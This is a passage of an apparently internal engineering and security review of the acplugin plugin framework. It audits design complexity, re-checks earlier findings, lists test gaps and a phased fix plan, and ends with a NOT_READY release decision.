其余对抗性检查结果：symlink / 特殊文件在 `scanPhysicalTree` 中被拒绝；case/Unicode collision 在 preserved 快照与 Package 路径两处都用 `sourceCollisionKey` 折叠检测；TOCTOU 由 `materializationBytes` 在每次落盘前重新校验来源；`fs.rm(lockPath)` 只在成功获锁的路径上执行（`acquireLock` 位于 `try` 之外），不会误删他人的锁。

---

## 6. Over-design and Complexity Audit

### 合理复杂度（应保留）

| 复杂度来源 | 为什么合理 |
| --- | --- |
| **Capability 授权体系**（`SourceRegistry` / `AssetRegistry` / `WorkDirectoryRegistry` / `BuildSessionScope` / grant / brand） | 这是全仓最大的单一复杂度来源，也是**最有正当性**的一个。威胁模型真实存在：第三方 Platform/Extension 是 npm 包，在作者的构建进程内执行。没有它，"Platform 无 `dist` 写权限""Extension 只能引用自己的 Asset""owner/mode/hash 在继承中保持"全部无法成立。Vite/tsdown 不需要它，是因为它们不把插件当作**不可信**输入。 |
| **可恢复的整体输出事务** | §5 证明它真的能在 12 个崩溃窗口下保住上一份完整输出。这是"`dist` 是框架完整托管目录"这一产品承诺的唯一实现方式。 |
| **六平台 compatibility + 最终 candidate validation** | 跨平台 wire protocol 差异是产品的核心价值，不是可省的抽象。compatibility registry 的覆盖强制、cause 无环校验、依赖最差等级传播到不动点都有真实语义。 |
| **两个 Compiler profile（portable-node / managed-rolldown）** | 二者权限边界确实不同：portable 完全由 Core 固定 input/output/plugins；managed 向可信集成开放受限 Rolldown 面。这不是重复，是两个不同的信任级别。 |
| **每阶段一个 provider / registry 模块** | 机械核查显示 Core 40 个模块**无一个零引用**，也没有 single-implementation 工厂或接口。这些是线性流水线的分解，不是投机抽象。 |

### 可删除复杂度

只有三处，合计影响很小：

1. **`validateCompleteMaterialization` 在提交路径上的重复物化**（P3-5）——`if (!input.commit)` 一行收敛，每次构建少写一遍全量输出。
2. **transaction marker 的 `scope` 字段**（P3-7）——被严格校验但从不参与恢复分支，是纯粹的死数据，且参与 marker 不匹配判定从而制造了一个无自愈的失败态。
3. **`packages/core/src/resources/project-graph.ts`（24 行，单一引用者）与 `kernel/report-safety.ts`（23 行）** —— 属于"文件过小"而非过度设计，不构成 Finding，仅记录。

### 错误抽象

**未发现。** 特别核查了以下常见反模式，均不存在：
- 单实现接口 / 单产品工厂：无
- 为复用而制造的错误公共抽象：无——Hooks 与 MCP 的 Contributor 共享 `contributors/common.ts`，但那是真实的两个调用方
- 本应由 Core 统一提供却被多包重复实现的能力：**只有一处**——严格 JSON 快照在 Core（`data-boundary.ts`）与 Hooks（`discovery.ts:117`）有两套语义分叉的实现（P2-12）。这是唯一一处应当收敛的重复
- 本应留在 Platform 却被下沉到 Core 的目标协议：**无**。Core 中不含任何平台名分支；Runtime 的 `native`/`unsupported` 判定读的是 Platform 自己声明的 capability，不是 Core 内置的平台知识

### 不应继续实现的能力

- **Extension 依赖图 / 顺序协议 / override 系统**：当前明确不提供，且**应当继续不提供**。本轮未发现任何两个以上的真实案例需要它。现有的"无序 add-only + 独占 extension point claim + 冲突即失败"模型已经足够，且是确定性的。
- **v1 兼容层**：已明确不保留，`LIFECYCLE_API_VERSION` 维持 `'1'`。正确。
- **CLI 的 strict 覆盖层**：文档声称存在但实际不存在（P1-8）。建议**删文档而非补实现**——它会给 `ProjectRunOptions` 增加公开字段并引入一套三级优先级规则，与"CLI 不维护第二条构建路径"原则相悖，而 `build.strict` + Platform 工厂 `strict` 已覆盖需求。

---

## 7. Previous Finding Audit

工作树中已存在一份先前 Review：`.llmdoc-tmp/reviews/kernel-v2-final-cross-review-2026-08-14.md`（2026-08-18 14:11 定稿，`NOT_READY`，6×P1 / 6×P2 / 3×P3）。本轮**未默认其正确**，对其 15 条结论逐一独立复验。副本已保留于 `.llmdoc-tmp/reviews/_superseded-kernel-v2-final-cross-review-2026-08-18T1411.md`。

| 先前 Finding | 本轮判定 | 独立复验方式与结论 |
| --- | --- | --- |
| **F1** Changesets 会发布稳定 1.0 | **仍然成立** | **[EXEC]** 实跑 `changeset status`：九个包全部 `newVersion: "1.0.0"`；`.changeset/` 无 `pre.json`；`semver.inc('0.0.2-beta','major')==='1.0.0'`。→ 本轮 **P1-1** |
| **F2** Patch workflow 不刷新生态快照 | **仍然成立** | **[READ+EXEC]** 逐行读 `patch.yml:89,119-120`（只有 `version-packages` → `install --lockfile-only` → lint → typecheck，无快照生成、无 `release:verify`）+ `verify-release.mjs:143` 的相等断言。→ 本轮 **P1-2** |
| **F3** watcher reconciliation 失败丢事件 + 未处理拒绝 | **仍然成立** | **[READ]** 在读到该 Review 之前已独立发现同一问题。行号复核：`dev-session.ts:213` 的 `void drain()`、`:263` 的 throw、`:274-280` 先提交 snapshot 后物理应用、`:307` 未 await 的 unwatch。→ 本轮 **P1-3** |
| **F4** close 失败使 `closed` 永不 settle | **仍然成立，且范围更大** | **[READ]** 同样在阅读该 Review 前独立发现。本轮**追加**一个先前未记录的同源缺陷：`poller` 创建于 `:166`，而 watcher 初始化在 `:403-416` 位于 `try`（`:418`）之外，构造期失败会同时泄漏 poller 与半初始化 watcher。→ 本轮 **P1-4** |
| **F5** transaction lock 非崩溃安全 | **仍然成立** | **[EXEC]** 独立重跑其 repro：预置空 lock → 稳定抛 `Managed output is locked` 且空锁残留。本轮**追加** PID 复用无逃生路径这一残余缺口。→ 本轮 **P1-5** |
| **F6** MCP stdio smoke 可被冒充 | **仍然成立** | **[EXEC]** 独立重跑 `mcp-fake-smoke` fixture：两行 printf 的"server"得到 `success=true, committed=true, diagnostics=[]`，兼容性为 `native`。并逐行复核 `build.ts:84` 的判定确实不检查 envelope/error/协商字段。→ 本轮 **P1-6** |
| **F7** MCP descriptor 非 transport 判别联合 | **仍然成立** | **[READ+EXEC]** `discovery.ts:13` 的 `FIELDS` 确为并集；同一 fixture 中 stdio 携带 `url` + `auth:{type:'none',env:...}` 被静默接受。→ 本轮 **P2-3** |
| **F8** `entry: './server.ts'` 报文件缺失 | **仍然成立，但需重新定性** | **[READ]** 机制确认（`path-policy.ts:50-52` 拒绝 `.` segment → `entrySource` 为 undefined → 报 `MCP_ENTRY_MISSING`）。**但先前描述不够准确**：所有实际代码示例（docs/README/playground）都正确使用 `'server.ts'`，只有 `types.ts:57` 的 TSDoc 及其生成的 TypeDoc 页声明了 `./server.ts`。本轮同时发现**先前未记录的内部矛盾**：`discovery.ts:110` 与 `:176` 对默认值的取值不同。→ 本轮 **P2-11**（重新定性） |
| **F9** Hooks 快照丢弃嵌套 `undefined` | **仍然成立** | **[READ]** `discovery.ts:117-118` 确为 `continue`。→ 本轮 **P2-12** |
| **F10** `current` 语义两份规范矛盾 | **仍然成立，但应收窄** | **[READ]** 行为本身自洽（最近成功值，首轮失败时以失败报告播种）。真正的缺陷是 `kernel-types.ts:1014` 是 `DevSession` 接口里**唯一无文档注释**的成员，公开契约未定义。降级为文档/契约缺口。→ 本轮 **P3-1** |
| **F11** Extension build 失败误归因给每个平台 | **仍然成立** | **[READ]** `build-session.ts:150` 确实排除 extension-owned error，`extension-provider.ts:347-349` 确实 throw，被 `runPlatformStage('contribute')` 转成 per-platform 错误。→ 本轮 **P2-10** |
| **F12** managed deterministic 审计比 portable 窄 | **仍然成立** | **[READ]** `managed-auditor.ts:213-219` 只比对完整模块 ID；`portable-auditor.ts:19-25` 比对全部物理根 + separator 变体。不对称确认。→ 本轮 **P2-9** |
| **F13** Scanner 僵尸术语 | **仍然成立，范围更大** | **[EXEC]** grep 确认 `kernel-types.ts:472`、六平台 `components.ts`、`AGENTS.md:94`、`README.md:379`。本轮**追加**先前未列出的 user-facing 命中：`troubleshooting.md:12` 的章节标题、`project-structure.md:27`、`guide/index.md:7`、`commands-skills-agents.md:3`。→ 本轮 **P3-2** |
| **F14** staged whitespace 门禁失败 | **仍然成立** | **[EXEC]** `git diff --cached --check` exit 2，三个文件行号完全一致。→ 本轮 **P3-3** |
| **F15** `INTERNAL_ERROR` phase 硬编码为 `package` | **仍然成立** | **[READ]** `build-session.ts:968` 确认。→ 本轮 **P3-4** |

### 审计结论

**15 条先前结论全部仍然成立，0 条误报，0 条已解决，2 条需要重新定性（F8 收窄为类型注释矛盾 + 诊断不准确；F10 收窄为公开契约文档缺口）。** 先前 Review 的准确率很高。

### 本轮新增、先前 Review 未覆盖的问题

| 新 Finding | 为什么先前会漏 |
| --- | --- |
| **P1-7** Claude Code orphan `.mcp.json` 校验旁路 | 需要构造第三方 Extension fixture 并对比"引用"与"孤儿"两种投递形态才能发现 |
| **P1-8** `--strict`/`--no-strict` 是虚构的 CLI 契约 | 需要实际执行 CLI 并与 10 处文档逐一对照 |
| **P1-9** 唯一的 DevSession 测试未跟踪且 flaky | 需要重复执行同一测试文件才会暴露（单次全量执行是绿的） |
| **P2-1** 交付目录权限为 `0700` | 需要检查**目录** mode；所有现有测试与 verify 脚本只断言文件 mode，且以同一 uid 运行 |
| **P2-2** managed `addWatchFile()` 拒绝未生成文件 | 需要构造使用 `addWatchFile` 的第三方 managed 插件；官方集成全部不用该 API |
| **P2-4** Codex 同源 orphan 缺口 | 同 P1-7 |
| **P2-5** 第三方可向 hooks wire 注入任意 shell 命令 | 需要第三方 Contributor fixture 才能观察 |
| **P2-6** 八个 tarball 的 devDependencies 残留 `@acplugin/core` | 需要实际 pack 并解包检查 devDependencies；发布门禁只查三个运行时字段 |
| **P2-7** `^0.0.2-beta` peer 范围排除一切后续主包版本 | 需要对 caret 在 `0.0.x` 下的语义做 semver 求值 |
| **P2-8** clean consumer 未覆盖第三方 Extension 与独立包实例 | 需要读 `verify-release.mjs` 的 fixture 构造细节而非只看它是否通过 |
| **P2-13** troubleshooting 列出四个不存在的诊断码 | 需要实际跑 `--json` 并与源码码表比对 |
| **P2-14** vitest 缺 hooks 源码 alias | 需要逐条比对 alias 表与 import 表 |
| **P3-5 / P3-6 / P3-7** 重复物化、键顺序依赖、死 `scope` 字段 | 结构性观察 |

---

## 8. Test and Verification Gaps

全部门禁通过却存在 9 个 P1，根因是覆盖面集中在正常路径。具体缺口：

| # | 缺口 | 关联 Finding | 建议补充 |
| --- | --- | --- | --- |
| G1 | **DevSession 故障路径零覆盖**：无 `watcher.add`/`unwatch`/`getWatched`/timeout 故障注入，无 `watcher.close()` reject，无并发 close，无构造期失败 | P1-3, P1-4 | 一组 watcher fault-injection 测试；断言事件成对、无 unhandled rejection、`closed` 必 settle、无 timer/handle 泄漏 |
| G2 | **DevSession 唯一测试未进入版本控制且 flaky** | P1-9 | `git add` + 修竞态；连跑 20 次零失败 |
| G3 | **transaction lock 故障零覆盖**：现有覆盖只到"完整的 dead-PID lock"，没有空 / 截断 / 写失败 / rm 失败 / PID 复用 / 同进程 stale token | P1-5 | 每个 lock 窗口一个 fault-injection 用例 |
| G4 | **目录 mode 完全不在断言范围内**：`verify-playground.mjs` 只快照文件 mode；所有测试同 uid 运行 | P2-1 | 把目录 mode 纳入 materialize/candidate/transaction/subset 四条路径的复核基准 |
| G5 | **第三方对抗面只有官方 Extension 测试**：没有任何"仅使用公开 `/sdk` 的最小第三方 Extension"fixture | P1-7, P2-3, P2-4, P2-5, P2-8 | 建立一个共享的敌对第三方 fixture，对六个平台分别投递 referenced 与 orphan 两种非法 wire |
| G6 | **MCP 协议 smoke 只有正向用例**：无伪 server、无 error envelope、无缺协商字段、无重复 id | P1-6 | 九类负向 smoke 用例 |
| G7 | **managed-rolldown 的第三方使用面几乎无覆盖**：`addWatchFile` 零测试，deterministic 只测完整模块 ID 泄漏 | P2-2, P2-9 | `addWatchFile`（存在/不存在/越界 × 有无 symlink 祖先）；deterministic 注入四类物理根 |
| G8 | **发布验证覆盖"版本写入之前"，不覆盖"版本写入之后"** | P1-1, P1-2 | 在 workflow 等价环境中执行 `version-packages` 后再跑 `release:verify` |
| G9 | **tarball 检查只覆盖三个运行时依赖字段** | P2-6 | 加入 `devDependencies` |
| G10 | **CLI 选项与文档无一致性检查** | P1-8, P2-13 | 一个把 `createCli()` 实际注册的选项/诊断码与文档中出现的对照的静态测试 |
| G11 | **`hooks` 集成测试跑 dist 而非源码** | P2-14 | 补 alias |
| G12 | **Pi 没有 golden 测试**（六平台中唯一） | P3-11 | 补齐或明确记录为有意省略 |

---

## 9. Recommended Fix Order

五个阶段。前两个阶段完成前**不得触发 Patch workflow**。

---

### Phase 0 — 发布安全急停（先做，纯配置/流程，无产品代码）

**Scope：** P1-1、P1-2、P3-6、P3-8、P3-10
**Non-goals：** 不改任何 Core / Platform / Extension 源码；不做版本晋升决策本身，只保证晋升不会意外发生。

1. **架构决策 A：确定 beta release line 与 stable promotion 机制。** 若继续 beta → `pnpm changeset pre enter beta` 并把 `initial-1-0-baseline.md` 移出可消费目录；若确实 GA → 在 `repository.test.ts` 中显式断言预期版本终态。
2. 新增从九个 manifest 生成 `ecosystem-versions.json` 的脚本，接入 `package.json` 的 `version-packages` script 本身（不可跳过）。
3. 同批修 `verify-release.mjs:19` 的键顺序依赖（否则第 2 步会触发它）。
4. `patch.yml` 在创建 PR 前追加 `pnpm run release:verify`，并拒绝未授权的 prerelease → stable 跃迁。

**测试与 DoD：** 在 workflow 等价环境执行 `version-packages` 后 `release:verify` 通过；`changeset status` 只产生预期版本；无显式 promotion 输入时 `0.0.x-beta → 1.0.0` 必须失败。

---

### Phase 1 — 安全边界（对抗性缺陷，影响已发布产物的可信度）

**Scope：** P1-6、P1-7、P2-3、P2-4；同时建立 G5 的第三方对抗 fixture
**Non-goals：** 不改 Contributor 模型；不引入 Extension 顺序或依赖协议。

1. 建立最小敌对第三方 Extension fixture（仅用公开 `/sdk`），作为后续所有对抗测试的宿主。
2. `claude-code/src/validator.ts:697` 与 `codex/src/validator.ts:1065` 各加一行 `.mcp.json` orphan 兜底，镜像已有的 hooks 兜底。**并确立通则：凡目标平台会自动发现的根文件，最终校验必须由"文件存在"驱动**（参考 `antigravity/src/validator.ts:160-172`）。
3. `mcp/src/build.ts:79-85` 严格化 smoke：JSON-RPC 2.0 envelope、无 error、id 唯一匹配、`initialize.result` 含协商后的 `protocolVersion`/`capabilities`/`serverInfo`、`tools/list.result.tools` 为数组。
4. `mcp/src/discovery.ts:13,146-180` 改为按 transport / 按 `auth.type` 的精确判别联合。

**测试与 DoD：** 同一非法 payload 在 referenced 与 orphan 两种形态下于六个平台被同等拒绝；九类负向 smoke 用例全部失败；官方 Contributor 输出与 playground 字节不变。

---

### Phase 2 — 故障边界收敛（Core 可靠性）

**Scope：** P1-3、P1-4、P1-5、P2-1
**Non-goals：** 不改 DevSession 的事件语义或轮次调度模型；不改事务的四分支恢复逻辑（§5 已证明其正确）。

1. **架构决策 B：确定 transaction lock 的持久记录格式**（record 结构、PID 复用策略、同进程 ownership、legacy lock 处理）。随后局部重写 `transaction.ts:429-459`。
2. `dev-session.ts:267-313` 改为"准备 → 物理应用 → 提交 snapshot"；await `unwatch`；watcher 失败转为稳定 dev failure report。
3. `round()` 加 `try/finally` 保证 start/complete 配对；`requestDrain` 的 `void drain()` 显式收敛 rejection。
4. `close()` 的终态五步放入嵌套 `finally`；`createDevSession` 的 watcher 构造纳入带 cleanup 的 try。
5. 交付目录 mode 统一 `0755` 并纳入四条路径的复核基准。

**测试与 DoD：** G1、G3、G4 三组缺口补齐；`acplugin dev` 在注入 watcher 故障后仍能被 Ctrl+C 正常终止且退出码为 130；每个 lock 窗口最多一个 writer 且下一轮可自动恢复。

---

### Phase 3 — 契约与文档一致性

**Scope：** P1-8、P1-9、P2-10、P2-11、P2-12、P2-13、P2-14、P3-1、P3-2、P3-3、P3-4
**Non-goals：** 不为 CLI 补 strict 覆盖层（见 §6"不应继续实现的能力"）；不机械重写 `migration/legacy/**`。

1. 从 8 处 build/validate 语境删除 `--strict`/`--no-strict`（**保留** migrate 语境的 4 处），并新增"文档选项 vs `createCli()` 实际选项"一致性测试。
2. `git add` DevSession 测试并修其竞态。
3. 修 P2-10 的误归因、P2-11 的三处默认值不一致与诊断码、P2-12 的 `undefined` 丢弃、P2-13 的四个诊断码、P2-14 的 alias。
4. 补 `DevSession.current` 的 TSDoc；统一 Scanner 术语；清理三处 staged 空行；为 `INTERNAL_ERROR` 引入真实 phase。

**测试与 DoD：** `git diff --check` 与 `git diff --cached --check` 均 exit 0；`docs:check` 通过且文档中出现的诊断码/CLI 选项全部可静态验证存在。

---

### Phase 4 — 发行边界收尾与复杂度回收

**Scope：** P2-6、P2-7、P2-8、P2-9、P3-5、P3-7、P3-9、P3-11
**Non-goals：** 不改九包生态结构；不改 brand 机制（已验证正确）。

1. **架构决策 C（与决策 A 同批）：** beta 窗口内的 peer 范围策略——`workspace:*` / 显式 `>=`，或规定主包发布必须九包同步 bump。
2. `verify-release.mjs:381` 加入 `devDependencies`；从六个 Platform manifest 移除 `@acplugin/core` devDependency。
3. `verifyConsumer` 中加入 `file:` 形式的第三方包（同时导出 Platform 与 Extension 工厂），覆盖独立实例与非 `plugin` deliveryType。
4. managed deterministic 审计与 portable 共享 physical-root 扫描。
5. `validateCompleteMaterialization` 收敛为 `if (!input.commit)`；处理 marker `scope` 死字段与不匹配自愈；更正"private Symbol"措辞；清理孤儿空目录。

**测试与 DoD：** 九个 tarball 四类依赖字段均无 `@acplugin/*`；"只发布主包"场景下八个集成仍可解析；第三方 Extension 在 packed clean consumer 中完成完整构建。

---

### 需要的三个架构决策（汇总）

| 决策 | 内容 | 阻塞的 Finding |
| --- | --- | --- |
| **A** | beta release line 与 stable promotion 的唯一机制 | P1-1 |
| **B** | transaction lock 的持久崩溃记录协议（格式、PID 复用、同进程 ownership、legacy） | P1-5 |
| **C** | Extension 是否在信任边界之内——即是否强制 hook `command` 只能是受管 handler | P2-5 |

（P2-7 的 peer 范围策略是决策 A 的直接推论，不单列。）

---

## 10. Final Decision

# `NOT_READY`

### 判定依据

**不可交付的直接原因**（任一即阻断）：

1. **P1-1** — Changesets 目前处于"扣动扳机即把 beta 发布为稳定 `1.0.0`"的状态。
2. **P1-2** — 即使不误发，任何一次版本 PR 都会产生自相矛盾的生态快照，导致 `init` 生成装不上的工程。
3. **P1-7** — Platform 最终 candidate validation 存在可执行验证的第三方注入旁路。
4. **P1-6** — 伪 MCP 可以冒充完整实现并以 `native` 兼容性交付。
5. **P1-5** — 一次崩溃或瞬时文件系统错误就能永久楔死受管输出，只能人工删文件恢复。
6. **P1-9** — 唯一的 DevSession 测试未进入版本控制且 flaky，门禁绿灯不可信。

### 同时明确的正面结论

- **不建议整体重写。** 目标架构的十二条目标中，除"最终 candidate validation 无旁路"一条外全部独立验证通过。
- **不存在明显过度设计。** Core 无死模块、无单实现抽象、无投机泛化；作者 API 只有一个 `defineConfig()`。多出的复杂度可逐项追溯到真实的安全、事务或跨平台需求。
- **没有偏离初衷。** 仍是"Core 基于 Rolldown 提供开箱即用跨平台 Plugin 框架和 CLI"。
- **事务恢复矩阵本身是正确的**，12 个崩溃窗口逐一推演无缺陷。
- **需要重写的代码只有一处**：`transaction.ts:429-459` 的 lock 子协议（约 30 行）。

### 达到 `READY` 的最小条件

完成 **Phase 0 + Phase 1 + Phase 2**（含架构决策 A、B），并补齐测试缺口 **G1–G6**。
Phase 3 与 Phase 4 可作为 `READY_WITH_NON_BLOCKING_FOLLOWUPS` 的后续项，但 **P1-8（虚构 CLI 选项）与 P1-9（flaky 测试）建议一并纳入阻断集**——前者是面向用户的产品承诺失效，后者会让所有阶段的验收结果失去可信度。

---

*本 Review 的复现 fixture 位于 `.llmdoc-tmp/repros/`：`watchfile-repro.test.ts`（P2-2）、`transaction-empty-lock.test.ts`（P1-5）、`mcp-fake-smoke/`（P1-6、P2-3）、`packcheck/`（P2-6、P2-7）、`harness.mjs` + `evil-extension-source.mjs` + `run-scenarios.mjs`（P1-7、P2-4、P2-5）、`dupbrand/`（P2-8 的 brand 正面验证）、`diag*/`（P2-13）。*






